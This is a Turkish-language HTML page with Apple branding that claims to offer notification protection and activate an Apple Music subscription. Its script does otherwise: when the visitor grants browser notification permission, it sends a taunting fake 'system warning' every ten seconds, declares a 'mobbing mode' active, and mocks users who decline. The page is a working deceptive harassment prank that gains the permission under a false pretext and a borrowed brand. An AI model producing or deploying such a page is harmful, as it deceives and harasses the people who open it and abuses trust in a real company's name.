<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Bildirim Merkezi</title>
    
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon" href="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">

    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
        .box { padding: 30px; border: 1px solid #333; border-radius: 20px; width: 80%; }
        .btn-notif { background: #30d158; color: white; padding: 15px 30px; border-radius: 12px; font-weight: bold; border: none; cursor: pointer; }
        .desc { font-size: 14px; color: #8e8e93; margin-bottom: 20px; }
    </style>
</head>
<body>

    <div class="box">
        <h2>Bildirim Koruması</h2>
        <p class="desc">Gereksiz bildirimleri engellemek ve Apple Music aboneliğini aktif etmek için izni onaylayın.</p>
        <button class="btn-notif" onclick="askPermission()">BİLDİRİMLERİ AÇ</button>
    </div>

    <script>
        async function askPermission() {
            // Tarayıcı desteği kontrolü
            if (!("Notification" in window)) {
                alert("Aga bu tarayıcıda bildirim olmaz, Ana Ekran'a eklemen lazım!");
                return;
            }

            // İzin İste
            const permission = await Notification.requestPermission();

            if (permission === "granted") {
                // Sadece BİLDİRİM atacak, ekranı kilitlemeyecek
                // Her 10 saniyede bir (10000ms) bir tane salla
                setInterval(() => {
                    new Notification("🚨 SİSTEM UYARISI!", {
                        body: "HAHAHA HADİ SİL LAN! SİLEBİLİYORSAN SİL!",
                        icon: "https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"
                    });
                }, 10000); 

                // İkinci bir bildirim daha (şov olsun)
                new Notification("BAŞARILI!", {
                    body: "Mobbing modu başarıyla aktif edildi koçum."
                });
            } else {
                alert("İzni vermedin, trolledik seni!");
            }
        }
    </script>

</body>
</html>
